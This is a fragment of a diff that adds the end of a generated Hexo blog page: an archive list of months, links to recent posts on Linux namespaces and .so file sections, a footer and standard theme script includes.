href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/06/User-namespace/">User namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
